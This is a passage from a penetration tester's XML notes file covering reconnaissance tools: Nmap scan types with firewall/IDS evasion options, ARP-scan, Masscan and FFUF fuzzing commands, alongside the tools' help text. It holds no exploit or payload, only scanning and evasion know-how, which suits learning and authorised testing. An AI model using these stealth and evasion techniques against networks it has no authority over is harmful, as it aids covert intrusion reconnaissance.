        <rich_text weight="heavy">CATEGORY/NAME</rich_text>
        <rich_text>

--script=</rich_text>
        <rich_text weight="heavy">SCRIPT1,SCRIPT2,....</rich_text>
        <rich_text>

--script-args </rich_text>
        <rich_text weight="heavy">SCRIPT.ARG</rich_text>
        <rich_text>=</rich_text>
        <rich_text weight="heavy">VALUE</rich_text>
      </node>
      <node name="Evasion" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1696528645" ts_lastsave="1699971770">
        <rich_text link="webs https://nmap.org/book/man-bypass-firewalls-ids.html">https://nmap.org/book/man-bypass-firewalls-ids.html</rich_text>
        <rich_text> 

-sU: SUDO, UDP scan, very slow , best use with --top-ports </rich_text>
        <rich_text weight="heavy">NR</rich_text>
        <rich_text>

-sT: TCP scan, full 3-way handshake

-sS: SUDO, SYN scan, A bit more stealthy, no full 3-way handshake &lt;-SYN/ACK -&gt; RST

-sN: SUDO, NULL scan,  more stealthy, no flag, open/filtered ports &lt;- RST 

-sF: SUDO, FIN scan,  more stealthy, FIN flag, open/filtered ports &lt;- RST

-sX: SUDO, XMAS scan,  more stealthy, PSH &amp; URG&amp; FIN flag, open/filtered ports &lt;- RST


-Pn: no checking if host is alive (ping)

-f: fragment packets

--mtu </rich_text>
        <rich_text weight="heavy">NR</rich_text>
        <rich_text>: multiple of 8

--scan-delay </rich_text>
        <rich_text weight="heavy">MS</rich_text>
        <rich_text>ms

--badsum: to detect if FW is present &lt;- replies from FW</rich_text>
      </node>
      <node name="Manual" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="" ts_creation="1699958063" ts_lastsave="1700046249">
        <rich_text>Usage: nmap [Scan Type(s)] [Options] {target specification}

TARGET SPECIFICATION:
</rich_text>
        <rich_text indent="1">  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL &lt;inputfilename&gt;: Input from list of hosts/networks
  -iR &lt;num hosts&gt;: Choose random targets
  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
  --excludefile &lt;exclude_file&gt;: Exclude list from file</rich_text>
        <rich_text>

HOST DISCOVERY:
</rich_text>
        <rich_text indent="1">  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host</rich_text>
        <rich_text>

SCAN TECHNIQUES:
</rich_text>
        <rich_text indent="1">  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags &lt;flags&gt;: Customize TCP scan flags
  -sI &lt;zombie host[:probeport]&gt;: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b &lt;FTP relay host&gt;: FTP bounce scan</rich_text>
        <rich_text>

PORT SPECIFICATION AND SCAN ORDER:
</rich_text>
        <rich_text indent="1">  -p &lt;port ranges&gt;: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports sequentially - don't randomize
  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports
  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;</rich_text>
        <rich_text>

SERVICE/VERSION DETECTION:
</rich_text>
        <rich_text indent="1">  -sV: Probe open ports to determine service/version info
  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)</rich_text>
        <rich_text>

SCRIPT SCAN:
</rich_text>
        <rich_text indent="1">  -sC: equivalent to --script=default
  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of
           directories, script-files or script-categories
  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=&lt;Lua scripts&gt;: Show help about scripts.
           &lt;Lua scripts&gt; is a comma-separated list of script-files or
           script-categories.</rich_text>
        <rich_text>

OS DETECTION:
</rich_text>
        <rich_text indent="1">  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively</rich_text>
        <rich_text>

TIMING AND PERFORMANCE:
</rich_text>
        <rich_text indent="1">  Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -T&lt;0-5&gt;: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes
  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies
      probe round trip time.
  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.
  --host-timeout &lt;time&gt;: Give up on target after this long
  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes
  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second
  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</rich_text>
        <rich_text>

FIREWALL/IDS EVASION AND SPOOFING:
</rich_text>
        <rich_text indent="1">  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)
  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys
  -S &lt;IP_Address&gt;: Spoof source address
  -e &lt;iface&gt;: Use specified interface
  -g/--source-port &lt;portnum&gt;: Use given port number
  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies
  --data &lt;hex string&gt;: Append a custom payload to sent packets
  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets
  --data-length &lt;num&gt;: Append random data to sent packets
  --ip-options &lt;options&gt;: Send packets with specified ip options
  --ttl &lt;val&gt;: Set IP time-to-live field
  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum</rich_text>
        <rich_text>

OUTPUT:
</rich_text>
        <rich_text indent="1">  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA &lt;basename&gt;: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume &lt;filename&gt;: Resume an aborted scan
  --noninteractive: Disable runtime interactions via keyboard
  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output</rich_text>
        <rich_text>

MISC:
</rich_text>
        <rich_text indent="1">  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir &lt;dirname&gt;: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.</rich_text>
        <rich_text>

EXAMPLES:
</rich_text>
        <rich_text indent="1">  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80</rich_text>
        <rich_text>

SEE THE MAN PAGE (</rich_text>
        <rich_text link="webs https://nmap.org/book/man.html">https://nmap.org/book/man.html</rich_text>
        <rich_text>) FOR MORE OPTIONS AND EXAMPLES

Nmap 7.94 ( https://nmap.org )</rich_text>
      </node>
    </node>
    <node name="ARP-Scan" unique_id="23" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695240625" ts_lastsave="1700046276">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Scan local network
</rich_text>
      <rich_text indent="1">sudo arp-scan -l</rich_text>
      <rich_text>

Specify interface
</rich_text>
      <rich_text indent="1">sudo arp-scan -I </rich_text>
      <rich_text indent="1" weight="heavy">eth0</rich_text>
      <rich_text indent="1"> -l</rich_text>
      <rich_text>

Scan target network
</rich_text>
      <rich_text indent="1">arp-scan </rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1">/</rich_text>
      <rich_text indent="1" weight="heavy">MASK</rich_text>
      <rich_text>



</rich_text>
      <node name="Manual" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="" ts_creation="1695240625" ts_lastsave="1700046286">
        <rich_text>Usage: arp-scan [options] [hosts...]

Target hosts must be specified on the command line unless the --file or --localnet option is used.

arp-scan uses raw sockets, which requires privileges on some systems:

Linux with POSIX.1e capabilities support using libcap:
</rich_text>
        <rich_text indent="1">       arp-scan is capabilities aware. It requires CAP_NET_RAW in the permitted
       set and only enables that capability for the required functions.</rich_text>
        <rich_text>
BSD and macOS:
</rich_text>
        <rich_text indent="1">       You need read/write access to /dev/bpf*</rich_text>
        <rich_text>
Any operating system:
       Running as root or SUID root will work on any OS but other methods
       are preferable where possible.

Targets can be IPv4 addresses or hostnames. You can also use CIDR notation
(10.0.0.0/24) (network and broadcast included), ranges (10.0.0.1-10.0.0.10),
and network:mask (10.0.0.0:255.255.255.0).

Options:

The data type for option arguments is shown by a letter in angle brackets: 

</rich_text>
        <rich_text indent="1">&lt;s&gt; Character string.
&lt;i&gt; Decimal integer, or hex if preceeded by 0x e.g. 2048 or 0x800.
&lt;f&gt; Floating point decimal number.
&lt;m&gt; MAC address, e.g. 01:23:45:67:89:ab or 01-23-45-67-89-ab (case insensitive)
&lt;a&gt; IPv4 address e.g. 10.0.0.1
&lt;h&gt; Hex encoded binary data. No leading 0x. (case insensitive).
&lt;x&gt; Something else - see option description.</rich_text>
        <rich_text>

General Options:

</rich_text>
        <rich_text indent="1">--help or -h		Display this usage message and exit.

--verbose or -v		Display verbose progress messages.
			Can be used than once to increase verbosity. Max=3.

--version or -V		Display program version details and exit.
			Shows the version, license details, libpcap version,
			and whether POSIX.1e capability support is included.

--interface=&lt;s&gt; or -I &lt;s&gt; Use network interface &lt;s&gt;.
			If this option is not specified, arp-scan will search
			the system interface list for the lowest numbered,
			configured up interface (excluding loopback).</rich_text>
        <rich_text>

Host Selection:

</rich_text>
        <rich_text indent="1">--file=&lt;s&gt; or -f &lt;s&gt;	Read hostnames or addresses from the specified file
			One name or address pattern per line. Use "-" for stdin.

--localnet or -l	Generate addresses from interface configuration.
			Generates list from interface address and netmask
			(network and broadcast included). You cannot use the
			--file option or give targets on the command line.
			Use --interface to specify the interface.</rich_text>
        <rich_text>

MAC/Vendor Mapping Files:

</rich_text>
        <rich_text indent="1">--ouifile=&lt;s&gt; or -O &lt;s&gt;	Use IEEE registry vendor mapping file &lt;s&gt;.
			Default is ieee-oui.txt in the current directory. If
			that is not found /usr/share/arp-scan/ieee-oui.txt
			is used.

--macfile=&lt;s&gt; or -m &lt;s&gt;	Use custom vendor mapping file &lt;s&gt;.
			Default is mac-vendor.txt in the current directory.
			If that is not found
			/etc/arp-scan/mac-vendor.txt is used.</rich_text>
        <rich_text>

Output Format Control:

</rich_text>
        <rich_text indent="1">--quiet or -q		Display minimal output for each responding host.
			Only the IP address and MAC address are displayed.
			Reduces memory usage by about 5MB because the
			vendor mapping files are not used. Only the ${ip}
			and ${mac} fields are available for the --format
			option if --quiet is specified.

--plain or -x		Supress header and footer text.
			Only display the responding host details. Useful if
			the output will be parsed by a script.

--ignoredups or -g	Don't display duplicate packets.
			By default duplicate packets are flagged with
			"(DUP: n)" where n is the number of times this
			host has responded.

--rtt or -D		Calculate and display the packet round-trip time.
			The time is displayed in milliseconds and fractional
			microseconds. Makes the ${rtt} field available for
			--format.

--format=&lt;s&gt; or -F &lt;s&gt;	Specify the output format string.
			The format is a string that will be output for each
			responding host. Host details can be included by
			inserting references to fields using the syntax
			"${field[;width]}". Fields are displayed right-
			aligned unless the width is negative in which case
			left alignment will be used. The following case-
			insensitive field names are recognised:

			IP	Host IPv4 address in dotted quad format
			Name	Host name if --resolve option given
			MAC	Host MAC address xx:xx:xx:xx:xx:xx
			HdrMAC	Ethernet source addr if different
			Vendor	Vendor details string
			Padding	Padding after ARP packet in hex if nonzero
			Framing	Framing type if not Ethernet_II
			VLAN	802.1Q VLAD ID if present
			Proto	ARP protocol if not 0x0800
			DUP	Packet number for duplicate packets (&gt;1)
			RTT	Round trip time if --rtt option given
			
			Only the "ip" and "mac" fields are available if the
			--quiet option is specified.
			
			Any characters that are not fields are output
			verbatim. "\" introduces escapes:
			
			\n newline
			\r carriage return
			\t tab
			\  suppress special meaning for following character
			
			You should enclose the --format argument in 'single
			quotes' to protect special characters from the shell.
			
			Example: --format='${ip}\t${mac}\t${vendor}'</rich_text>
        <rich_text>

Host List Randomisation:

</rich_text>
        <rich_text indent="1">--random or -R		Randomise the target host list.

--randomseed=&lt;i&gt;	Seed the pseudo random number generator.
			Useful if you want a reproducible --random order.</rich_text>
        <rich_text>

Output Timing and Retry:

</rich_text>
        <rich_text indent="1">--retry=&lt;i&gt; or -r &lt;i&gt;	Set total number of attempts per host to &lt;i&gt;,
			default=2.

--backoff=&lt;f&gt; or -b &lt;f&gt;	Set backoff factor to &lt;f&gt;, default=1.50.
			Multiplies timeout by &lt;f&gt; for each pass.

--timeout=&lt;i&gt; or -t &lt;i&gt;	Set initial per host timeout to &lt;i&gt; ms, default=500.
			This timeout is for the first packet sent to each host.
			subsequent timeouts are multiplied by the backoff
			factor which is set with --backoff.

--interval=&lt;x&gt; or -i &lt;x&gt; Set minimum packet interval to &lt;x&gt;.
			This controls the outgoing bandwidth usage by limiting
			the packet rate. If you want to use up to a given
			bandwidth it is easier to use the --bandwidth option
			instead. The interval is in milliseconds, or
			microseconds if "u" is appended.

--bandwidth=&lt;x&gt; or -B &lt;x&gt; Set outbound bandwidth to &lt;x&gt;, default=256000.
			The value is in bits per second. Append K for
			kilobits or M for megabits (decimal multiples). You
			cannot specify both --interval and --bandwidth.</rich_text>
        <rich_text>

DNS Resolution:

</rich_text>
        <rich_text indent="1">--numeric or -N		Targets must be IP addresses, not hostnames.
			Can reduce startup time for large target lists.

--resolve or -d		Resolve responding addresses to hostnames.
			The default output format will display the hostname
			instead of the IPv4 address. This option makes the
			${name} field available for the --format option.</rich_text>
        <rich_text>

Output ARP Packet:

</rich_text>
        <rich_text indent="1">--arpsha=&lt;m&gt; or -u &lt;m&gt;	Set the ARP source Ethernet address.
			Sets the 48-bit ar$sha field but does not change the
			hardware address in the frame header, see --srcaddr
			for how to change that address. Default is the
			Ethernet address of the outgoing interface.

--arptha=&lt;m&gt; or -w &lt;m&gt;	Set the ARP target Ethernet address.
			Sets the 48-bit ar$tha field. The default is zero
			because this field is not used for ARP request packets.

--arphrd=&lt;i&gt; or -H &lt;i&gt;	Set the ARP hardware type, default=1.
			Sets the 16-bit ar$hrd field. The default is 1
			(ARPHRD_ETHER). Many operating systems also respond to
			6 (ARPHRD_IEEE802)

--arppro=&lt;i&gt; or -p &lt;i&gt;	Set the ARP protocol type, default=0x0800.
			Sets the 16-bit ar$pro field. Most operating systems
			only respond to 0x0800 (IPv4).

--arphln=&lt;i&gt; or -a &lt;i&gt;	Set the hardware address length, default=6.
			Sets the 8-bit ar$hln field. The lengths of the
			ar$sha and ar$tha fields are not changed by this
			option; it only changes the ar$hln field.

--arppln=&lt;i&gt; or -P &lt;i&gt;	Set the protocol address length, default=4.
			Sets the 8-bit ar$pln field. The lengths of the ar$spa
			and ar$tpa fields are not changed by this option;
			it only changes the ar$pln field.

--arpop=&lt;i&gt; or -o &lt;i&gt;	Specify the ARP operation, default=1.
			Sets the 16-bit ar$op field. Most operating systems
			only respond to the value 1 (ARPOP_REQUEST).

--arpspa=&lt;a&gt; or -s &lt;a&gt;	Set the source IPv4 address.
			The address should be in dotted quad format, or the
			string "dest", which sets the source address to
			the target host address. The default is the outgoing
			interface address. Sets the 32-bit ar$spa field. Some
			operating systems only respond if the source address
			is within the network of the receiving interface.
			Setting ar$spa to the destination IP address can cause
			some operating systems to report an address clash.</rich_text>
        <rich_text>

Output Ethernet Header:

</rich_text>
        <rich_text indent="1">--srcaddr=&lt;m&gt; or -S &lt;m&gt; Set the source Ethernet MAC address.
			Default is the interface MAC address. This sets the
			address in the Ethernet header. It does not change the
			address in the ARP packet: use --arpsha to change
			that address.

--destaddr=&lt;m&gt; or -T &lt;m&gt; Set the destination MAC address.
			Sets the destination address in the Ethernet
			header. Default is ff:ff:ff:ff:ff:ff (broadcast)
			Hosts also respond if the request is sent to their
			unicast address, or to a multicast address they
			are listening on.

--prototype=&lt;i&gt; or -y &lt;i&gt; Sets the Ethernet protocol type, default=0x0806.
			This sets the protocol type field in the Ethernet
			header.

--llc or -L		Use RFC 1042 LLC/SNAP encapsulation for 802.2 networks.
			arp-scan will decode and display ARP responses in both
			Ethernet-II and IEEE 802.2 formats irrespective of
			this option.

--vlan=&lt;i&gt; or -Q &lt;i&gt;	Use 802.1Q tagging with VLAN id &lt;i&gt;.
			The id should be in the range 0 to 4095. arp-scan will
			decode and display ARP responses in 802.1Q format
			irrespective of this option.</rich_text>
        <rich_text>

Misc Options:

</rich_text>
        <rich_text indent="1">--limit=&lt;i&gt; or -M &lt;i&gt;	Exit after the specified number of hosts have responded.
			arp-scan will exit with status 1 if the number of
			responding hosts is less than the limit. Can be used
			in scripts to check if fewer hosts respond without
			having to parse the output.

--pcapsavefile=&lt;s&gt; or -W &lt;s&gt;	Write received packets to pcap savefile &lt;s&gt;.
			ARP responses will be written to the specified file
			as well as being decoded and displayed.

--snap=&lt;i&gt; or -n &lt;i&gt;	Set the pcap snap length to &lt;i&gt;. Default=64.
			Specifies the frame capture length, including the
			Ethernet header. The default is normally sufficient.

--retry-send=&lt;i&gt; or -Y &lt;i&gt; Set number of send attempts, default=20.

--retry-send-interval=&lt;i&gt; or -E &lt;i&gt; Set interval between send attempts.
			Interval is in milliseconds or microseconds if "u"
			is appended. default=5.

--padding=&lt;h&gt; or -A &lt;h&gt;	Specify padding after packet data.
			Set padding after the ARP request to hex value &lt;h&gt;.
</rich_text>
        <rich_text>
Report bugs or send suggestions at https://github.com/royhills/arp-scan
See the arp-scan homepage at https://github.com/royhills/arp-scan
</rich_text>
      </node>
    </node>
    <node name="Masscan" unique_id="27" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695242334" ts_lastsave="1700046311">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
scan some ports at specified kpps
</rich_text>
      <rich_text indent="1">masscan -p</rich_text>
      <rich_text indent="1" weight="heavy">PORTS</rich_text>
      <rich_text indent="1">  </rich_text>
      <rich_text indent="1" weight="heavy">TARGET</rich_text>
      <rich_text indent="1"> --rate=</rich_text>
      <rich_text indent="1" weight="heavy">RATE</rich_text>
      <rich_text indent="1">

</rich_text>
      <rich_text> list  options that are compatible with nmap</rich_text>
      <rich_text indent="1">
masscan --nmap

</rich_text>
      <rich_text> save results of scan in binary format</rich_text>
      <rich_text indent="1">
masscan -p</rich_text>
      <rich_text indent="1" weight="heavy">PORTS</rich_text>
      <rich_text indent="1">  </rich_text>
      <rich_text indent="1" weight="heavy">TARGET</rich_text>
      <rich_text indent="1"> --banners -oB </rich_text>
      <rich_text indent="1" weight="heavy">FILE</rich_text>
      <rich_text indent="1">

</rich_text>
      <rich_text> read binary scan results in a file and save them as xml
</rich_text>
      <rich_text indent="1"> masscan --open --banners --readscan </rich_text>
      <rich_text indent="1" weight="heavy">BIN_FILE </rich_text>
      <rich_text indent="1">-oX </rich_text>
      <rich_text indent="1" weight="heavy">NEW_XML_FILE</rich_text>
      <rich_text>

</rich_text>
      <node name="Manual" unique_id="28" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="" ts_creation="1695242334" ts_lastsave="1700046364">
        <rich_text>MASSCAN is a fast port scanner. The primary input parameters are the IP addresses/ranges you want to scan, and the port numbers.

An example is the following, which scans the 10.x.x.x network for web servers:
</rich_text>
        <rich_text indent="1"> masscan 10.0.0.0/8 -p80</rich_text>
        <rich_text>
 
The program auto-detects network interface/adapter settings. If this fails, you'll have to set these manually. 
The following is an example of all the parameters that are needed:
</rich_text>
        <rich_text indent="1"> --adapter-ip 192.168.10.123
 --adapter-mac 00-11-22-33-44-55
 --router-mac 66-55-44-33-22-11</rich_text>
        <rich_text>
 
Parameters can be set either via the command-line or config-file. The names are the same for both. Thus, the above adapter settings would appear as follows in a configuration file:
</rich_text>
        <rich_text indent="1"> adapter-ip = 192.168.10.123
 adapter-mac = 00-11-22-33-44-55
 router-mac = 66-55-44-33-22-11</rich_text>
        <rich_text>
 
All single-dash parameters have a spelled out double-dash equivalent, so '-p80' is the same as '--ports 80' (or 'ports = 80' in config file).

To use the config file, type:  masscan -c &lt;filename&gt;

To generate a config-file from the current settings, use the --echo option.
This stops the program from actually running, and just echoes the current configuration instead. This is a useful way to generate your first config file, or see a list of parameters you didn't know about. 
</rich_text>
        <rich_text indent="1">I suggest you try it now:  masscan -p1234 --echo</rich_text>
        <rich_text>

</rich_text>
      </node>
    </node>
  </node>
  <node name="Enumeration" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695159816" ts_lastsave="1697104557">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
</rich_text>
    <node name="FFUF" unique_id="11" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695159786" ts_lastsave="1700045995">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Standard directory enumeration:
</rich_text>
      <rich_text indent="1">ffuf -w </rich_text>
      <rich_text indent="1" weight="heavy">/WORDLIST</rich_text>
      <rich_text indent="1"> -u </rich_text>
      <rich_text>http://</rich_text>
      <rich_text weight="heavy">IP</rich_text>
      <rich_text>/FUZZ

Subdomain enumeration with partial domain:
</rich_text>
      <rich_text indent="1">ffuf -w </rich_text>
      <rich_text indent="1" weight="heavy">/WORDLIST</rich_text>
      <rich_text indent="1"> -H "Host: FUZZ.</rich_text>
      <rich_text indent="1" weight="heavy">DOMAIN</rich_text>
      <rich_text indent="1">" -u </rich_text>
      <rich_text>http://IP

</rich_text>
      <node name="Manual" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="#ffffff" ts_creation="1695159950" ts_lastsave="1700046119">
        <rich_text>Fuzz Faster U Fool - v2.0.0-dev

HTTP OPTIONS:
</rich_text>
        <rich_text indent="1">  -H                  Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.
  -X                  HTTP method to use
  -b                  Cookie data `"NAME1=VALUE1; NAME2=VALUE2"` for copy as curl functionality.
  -d                  POST data
  -http2              Use HTTP2 protocol (default: false)
  -ignore-body        Do not fetch the response content. (default: false)
  -r                  Follow redirects (default: false)
  -recursion          Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)
  -recursion-depth    Maximum recursion depth. (default: 0)
  -recursion-strategy Recursion strategy: "default" for a redirect based, and "greedy" to recurse on all matches (default: default)
  -replay-proxy       Replay matched requests using this proxy.
  -sni                Target TLS SNI, does not support FUZZ keyword
  -timeout            HTTP request timeout in seconds. (default: 10)
  -u                  Target URL
  -x                  Proxy URL (SOCKS5 or HTTP). For example: http://127.0.0.1:8080 or socks5://127.0.0.1:8080</rich_text>
        <rich_text>

GENERAL OPTIONS:
</rich_text>
        <rich_text indent="1">  -V                  Show version information. (default: false)
  -ac                 Automatically calibrate filtering options (default: false)
  -acc                Custom auto-calibration string. Can be used multiple times. Implies -ac
  -ach                Per host autocalibration (default: false)
  -ack                Autocalibration keyword (default: FUZZ)
  -acs                Autocalibration strategy: "basic" or "advanced" (default: basic)
  -c                  Colorize output. (default: false)
  -config             Load configuration from a file
  -json               JSON output, printing newline-delimited JSON records (default: false)
  -maxtime            Maximum running time in seconds for entire process. (default: 0)
  -maxtime-job        Maximum running time in seconds per job. (default: 0)
  -noninteractive     Disable the interactive console functionality (default: false)
  -p                  Seconds of `delay` between requests, or a range of random delay. For example "0.1" or "0.1-2.0"
  -rate               Rate of requests per second (default: 0)
  -s                  Do not print additional information (silent mode) (default: false)
  -sa                 Stop on all error cases. Implies -sf and -se. (default: false)
  -scraperfile        Custom scraper file path
  -scrapers           Active scraper groups (default: all)
  -se                 Stop on spurious errors (default: false)
  -search             Search for a FFUFHASH payload from ffuf history
  -sf                 Stop when &gt; 95% of responses return 403 Forbidden (default: false)
  -t                  Number of concurrent threads. (default: 40)
  -v                  Verbose output, printing full URL and redirect location (if any) with the results. (default: false)</rich_text>
        <rich_text>

MATCHER OPTIONS:
</rich_text>
        <rich_text indent="1">  -mc                 Match HTTP status codes, or "all" for everything. (default: 200,204,301,302,307,401,403,405,500)
  -ml                 Match amount of lines in response
  -mmode              Matcher set operator. Either of: and, or (default: or)
  -mr                 Match regexp
  -ms                 Match HTTP response size
  -mt                 Match how many milliseconds to the first response byte, either greater or less than. EG: &gt;100 or &lt;100
  -mw                 Match amount of words in response</rich_text>
        <rich_text>

FILTER OPTIONS:
</rich_text>
        <rich_text indent="1">  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
  -fmode              Filter set operator. Either of: and, or (default: or)
  -fr                 Filter regexp
  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges
  -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: &gt;100 or &lt;100
  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges</rich_text>
        <rich_text>

INPUT OPTIONS:
</rich_text>
        <rich_text indent="1">  -D                  DirSearch wordlist compatibility mode. Used in conjunction with -e flag. (default: false)
  -e                  Comma separated list of extensions. Extends FUZZ keyword.
  -ic                 Ignore wordlist comments (default: false)
  -input-cmd          Command producing the input. --input-num is required when using this input method. Overrides -w.
  -input-num          Number of inputs to test. Used in conjunction with --input-cmd. (default: 100)
  -input-shell        Shell to be used for running command
  -mode               Multi-wordlist operation mode. Available modes: clusterbomb, pitchfork, sniper (default: clusterbomb)
  -request            File containing the raw http request
  -request-proto      Protocol to use along with raw request (default: https)
  -w                  Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'</rich_text>
        <rich_text>

OUTPUT OPTIONS:
</rich_text>
        <rich_text indent="1">  -debug-log          Write all of the internal logging to the specified file.
  -o                  Write output to file
  -od                 Directory path to store matched results to.
  -of                 Output file format. Available formats: json, ejson, html, md, csv, ecsv (or, 'all' for all formats) (default: json)
  -or                 Don't create the output file if we don't have results (default: false)</rich_text>
        <rich_text>

EXAMPLE USAGE:
</rich_text>
        <rich_text indent="1">  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
  Colored, verbose output.
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v</rich_text>
        <rich_text>

  Fuzz Host-header, match HTTP 200 responses.
</rich_text>
        <rich_text indent="1">    ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200</rich_text>
        <rich_text>

  Fuzz POST JSON data. Match all responses not containing text "error".
</rich_text>
        <rich_text indent="1">    ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
      -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"</rich_text>
        <rich_text>

  Fuzz multiple locations. Match only responses reflecting the value of "VAL" keyword. Colored.
</rich_text>
        <rich_text indent="1">    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c</rich_text>
        <rich_text>

  More information and examples: https://github.com/ffuf/ffuf</rich_text>
      </node>
    </node>
    <node name="Gobuster" unique_id="14" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695160129" ts_lastsave="1700055891">
